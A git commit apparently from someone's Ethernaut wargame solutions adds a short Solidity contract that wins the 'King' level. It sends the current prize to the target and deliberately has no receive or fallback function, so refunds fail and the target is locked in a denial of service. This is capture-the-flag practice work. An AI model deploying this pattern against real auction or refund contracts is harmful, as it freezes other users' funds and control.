455cedced13b5a272a57dd1f8b53b32b795c2f55
0xDrogon <tiagofsdomingues@gmail.com>
2023-01-29 17:11:30 +0000

    adds king

---
+++ King/Pwn.sol
@@ -0,0 +1,22 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./Ethernaut.sol";
+
+contract Pwn {
+
+    address payable private immutable target;
+
+    constructor(address payable _target) {
+        target = _target;
+    }
+
+    function pwn() payable external {
+        uint prize = King(target).prize();
+        (bool success,) = target.call{value: prize}("");
+        require(success, "call failed");
+    }
+
+    // no receive()
+    // no fallback()
+}
